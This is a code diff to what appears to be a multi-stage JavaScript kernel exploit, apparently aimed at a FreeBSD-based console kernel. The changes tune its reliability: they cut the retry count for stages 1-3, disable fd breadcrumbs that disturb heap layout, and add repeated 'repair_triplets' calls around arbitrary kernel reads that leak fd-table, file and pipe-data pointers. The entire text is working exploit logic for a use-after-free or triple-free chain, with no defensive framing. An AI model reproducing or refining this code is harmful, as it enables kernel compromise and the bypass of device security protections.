@@ -55,6 +55,7 @@
         const UIO_SYSSPACE = 1n;
 
         const TRIPLEFREE_ATTEMPTS = 96;
+        const STAGES123_ATTEMPTS = 1;
         const MAX_ROUNDS_TWIN = 10;
         const MAX_ROUNDS_TRIPLET = 500;
         const FIND_TRIPLET_FAST = 5000;
@@ -64,7 +65,9 @@
         const MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
         const LEAK_KQ_REPAIR_MODE = "full";
-        const KP_BREADCRUMBS = true;
+        // Disabled by default: opening/writing a breadcrumb fd before the burn
+        // changes fd-table pressure on a path that is layout-sensitive.
+        const KP_BREADCRUMBS = false;
 
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
@@ -1534,33 +1537,7 @@
             send_notification("Stage 2\nLeak pipe data pointers");
             await ulog("stage2: leaking pipe pointers...");
             let stage2_last_reason = "not started";
-            const stabilize_stage2_triplets = async (label) => {
-                const before = S.triplets.join(",");
-                for (let pass = 0; pass < 2; pass++) {
-                    const old1 = S.triplets[1];
-                    const old2 = S.triplets[2];
-                    const t1 = find_triplet(S, S.triplets[0], old2, 50000);
-                    syscall(SYSCALL.sched_yield);
-                    const t2 = t1 !== -1
-                        ? find_triplet(S, S.triplets[0], t1, 50000)
-                        : -1;
-                    if (t1 !== -1 && t2 !== -1 &&
-                        t1 !== S.triplets[0] && t2 !== S.triplets[0] &&
-                        t1 !== t2) {
-                        S.triplets[1] = t1;
-                        S.triplets[2] = t2;
-                        return true;
-                    }
-                    S.triplets[1] = old1;
-                    S.triplets[2] = old2;
-                    nanosleep_ms(10);
-                }
-                stage2_last_reason = "triplet stabilize failed for " + label +
-                    ": " + before + " -> " + S.triplets.join(",");
-                return false;
-            };
-            const read_stage2_ptr = async (name, kaddr) => {
-                if (!(await stabilize_stage2_triplets(name))) return null;
+            const read_stage2_ptr = (name, kaddr) => {
                 const val = kslow64(S, kaddr);
                 if (is_kernel_ptr(val)) return val;
                 if (val) {
@@ -1573,29 +1550,29 @@
                 return null;
             };
             for (let attempt = 0; attempt < 5; attempt++) {
-                nanosleep_ms(100);
-                const fdescenttbl = await read_stage2_ptr("fd table",
+                repair_triplets(S); nanosleep_ms(100);
+                const fdescenttbl = read_stage2_ptr("fd table",
                     S.proc_filedesc + S.OFF.FILEDESC_OFILES);
                 if (!fdescenttbl) continue;
                 S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
-                nanosleep_ms(250);
+                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                const master_fp = await read_stage2_ptr("master file pointer",
+                const master_fp = read_stage2_ptr("master file pointer",
                     S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
                 if (!master_fp) continue;
-                nanosleep_ms(250);
+                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                const victim_fp = await read_stage2_ptr("victim file pointer",
+                const victim_fp = read_stage2_ptr("victim file pointer",
                     S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
                 if (!victim_fp) continue;
-                nanosleep_ms(250);
+                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                S.master_pipe_data = await read_stage2_ptr("master pipe data",
+                S.master_pipe_data = read_stage2_ptr("master pipe data",
                     master_fp);
                 if (!S.master_pipe_data) continue;
-                nanosleep_ms(250);
+                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                S.victim_pipe_data = await read_stage2_ptr("victim pipe data",
+                S.victim_pipe_data = read_stage2_ptr("victim pipe data",
                     victim_fp);
                 if (!S.victim_pipe_data) continue;
 
@@ -1608,7 +1585,7 @@
                     return;
                 }
                 stage2_last_reason = "pipe data pointers matched";
-                nanosleep_ms(500);
+                nanosleep_ms(500); repair_triplets(S);
             }
             fail("stage2: failed to leak pipe pointers (" + stage2_last_reason + ")");
         }
@@ -2452,7 +2429,7 @@
             await stage0(S);
 
             let s123_ok = false;
-            for (let r = 1; r <= 8 && !s123_ok; r++) {
+            for (let r = 1; r <= STAGES123_ATTEMPTS && !s123_ok; r++) {
                 try {
                     breadcrumb("stages1_3:attempt=" + r);
                     await stage1(S);
@@ -2462,15 +2439,17 @@
                     breadcrumb("stages1_3:done attempt=" + r);
                 } catch (e) {
                     breadcrumb("stages1_3:failed attempt=" + r + " " + e.message);
-                    if (r < 8) {
-                        await ulog("stages 1-3 attempt " + r + "/8 failed: " +
+                    if (r < STAGES123_ATTEMPTS) {
+                        await ulog("stages 1-3 attempt " + r + "/" +
+                            STAGES123_ATTEMPTS + " failed: " +
                             e.message);
                         try { repair_triplets(S); } catch (_) { }
                         nanosleep_ms(500);
                     }
                 }
             }
-            if (!s123_ok) fail("stages 1-3 failed after 8 attempts");
+            if (!s123_ok) fail("stages 1-3 failed after " +
+                STAGES123_ATTEMPTS + " attempt(s)");
 
             await stage4(S);
             await stage5(S);
